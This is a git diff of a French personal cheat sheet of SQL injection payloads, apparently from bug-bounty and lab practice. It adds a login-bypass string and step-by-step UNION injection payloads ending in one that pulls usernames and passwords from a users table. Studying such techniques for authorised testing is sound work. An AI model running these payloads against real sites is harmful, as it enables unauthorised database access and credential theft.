@@ -20,5 +20,13 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 *Mes munitions prêtes à l'emploi pour le Bug Bounty.*
 
 ### 1. Contournement & Manipulation de Logique
-*   **Payload universel (Vrai absolu) :** `' OR 1=1--`
-    *   *Explication :* Ferme la chaîne de caractères initiale, force une condition validée, et commente le reste de la requête backend.
+* **Payload universel (Vrai absolu) :** `' OR 1=1--`
+    * *Explication :* Ferme la chaîne de caractères initiale, force une condition validée, et commente le reste de la requête backend.
+
+### 2. Attaques UNION (Exfiltration de données)
+* **Étape 1 : Trouver le nombre de colonnes :** `' UNION SELECT NULL--`
+    * *Méthode :* Ajouter des `,NULL` un par un jusqu'à ce que l'erreur 500 disparaisse et que la page charge normalement (200 OK).
+* **Étape 2 : Trouver les colonnes de type Texte :** `' UNION SELECT 'a',NULL,NULL--`
+    * *Méthode :* Remplacer chaque `NULL` par une chaîne de caractères (`'a'`) tour à tour pour voir laquelle s'affiche sur la page sans crasher.
+* **Étape 3 : Extraire les données (Data Breach) :** `' UNION SELECT username, password, NULL FROM users--`
+    * *Méthode :* Placer les noms des colonnes ciblées (ex: `username`) à la place des `NULL` qui acceptent du texte pour aspirer les données de la table ciblée.
